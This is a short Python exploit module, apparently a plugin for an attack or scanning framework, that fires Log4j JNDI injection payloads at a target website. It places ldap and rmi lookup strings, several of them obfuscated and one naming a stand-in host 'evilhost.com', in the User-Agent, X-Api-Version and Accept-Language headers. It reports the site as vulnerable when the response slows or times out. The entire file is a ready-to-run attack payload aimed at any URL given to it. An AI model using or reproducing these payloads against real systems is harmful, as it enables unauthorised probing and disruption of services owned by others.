import requests
from core.printmodels import *

class Log4j_DOS_Exploit:
    def __init__(self):
        self.name = "Log4j DOS"
        self.description = "Log4j Denial of Service Vulnerability"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                "User-Agent": "${jndi:ldap://127.0.0.1#.evilhost.com:1389/a}",
                "X-Api-Version": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/a}",
                "Accept-Language": "${${::-j}ndi:rmi://127.0.0.1/a}"
            }
            
            response = requests.get(site, headers=headers, verify=False, timeout=15)
            if response.elapsed.total_seconds() > 10:
                return PrintSuccess(f"[Log4j-DOS] Site potentially vulnerable to DOS!")
            return PrintFailed("[Log4j-DOS] Not Vulnerable")
        except requests.Timeout:
            return PrintSuccess(f"[Log4j-DOS] Site vulnerable - timeout detected!")
        except Exception as e:
            return PrintError(f"[Log4j-DOS] Error: {str(e)}")
